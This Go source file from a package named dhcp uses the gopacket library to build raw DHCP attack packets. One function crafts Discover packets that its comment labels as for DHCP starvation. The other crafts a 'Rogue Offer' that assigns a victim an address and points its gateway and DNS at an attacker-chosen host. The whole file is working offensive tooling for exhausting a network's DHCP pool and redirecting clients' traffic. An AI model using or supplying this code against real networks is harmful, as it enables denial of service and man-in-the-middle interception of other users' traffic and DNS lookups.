package dhcp

import (
	"math/rand"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

// CraftDHCPDiscover creates a DHCP starvaion packet (Discover with random MAC/XID).
func CraftDHCPDiscover(srcMAC net.HardwareAddr) ([]byte, error) {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		EthernetType: layers.EthernetTypeIPv4,
	}

	ip := layers.IPv4{
		Version:  4,
		TTL:      64,
		SrcIP:    net.IPv4zero,
		DstIP:    net.IPv4bcast,
		Protocol: layers.IPProtocolUDP,
	}

	udp := layers.UDP{
		SrcPort: 68,
		DstPort: 67,
	}
	udp.SetNetworkLayerForChecksum(&ip)

	xid := rand.Uint32()

	dhcp := layers.DHCPv4{
		Operation:    layers.DHCPOpRequest,
		HardwareType: layers.LinkTypeEthernet,
		HardwareLen:  6,
		Xid:          xid,
		ClientHWAddr: srcMAC,
		Options: []layers.DHCPOption{
			{
				Type:   layers.DHCPOptMessageType,
				Length: 1,
				Data:   []byte{byte(layers.DHCPMsgTypeDiscover)},
			},
			{
				Type:   layers.DHCPOptEnd,
				Length: 0,
			},
		},
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	err := gopacket.SerializeLayers(buf, opts, &eth, &ip, &udp, &dhcp)
	if err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

// CraftDHCPOffer creates a Rogue Offer.
func CraftDHCPOffer(srcMAC, dstMAC net.HardwareAddr, serverIP, offeredIP, gatewayIP net.IP, xid uint32) ([]byte, error) {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}

	ip := layers.IPv4{
		Version:  4,
		TTL:      64,
		SrcIP:    serverIP,
		DstIP:    net.IPv4bcast,
		Protocol: layers.IPProtocolUDP,
	}

	udp := layers.UDP{
		SrcPort: 67,
		DstPort: 68,
	}
	udp.SetNetworkLayerForChecksum(&ip)

	dhcp := layers.DHCPv4{
		Operation:    layers.DHCPOpReply,
		HardwareType: layers.LinkTypeEthernet,
		HardwareLen:  6,
		Xid:          xid,
		ClientHWAddr: dstMAC,
		YourClientIP: offeredIP,
		Options: []layers.DHCPOption{
			{
				Type:   layers.DHCPOptMessageType,
				Length: 1,
				Data:   []byte{byte(layers.DHCPMsgTypeOffer)},
			},
			{
				Type:   layers.DHCPOptSubnetMask,
				Length: 4,
				Data:   []byte{255, 255, 255, 0},
			},
			{
				Type:   layers.DHCPOptRouter,
				Length: 4,
				Data:   gatewayIP.To4(),
			},
			{
				Type:   layers.DHCPOptDNS,
				Length: 4,
				Data:   gatewayIP.To4(),
			},
			{
				Type:   layers.DHCPOptServerID,
				Length: 4,
				Data:   serverIP.To4(),
			},
			{
				Type:   layers.DHCPOptLeaseTime,
				Length: 4,
				Data:   []byte{0x00, 0x01, 0x51, 0x80},
			},
			{
				Type:   layers.DHCPOptEnd,
				Length: 0,
			},
		},
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	err := gopacket.SerializeLayers(buf, opts, &eth, &ip, &udp, &dhcp)
	if err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}
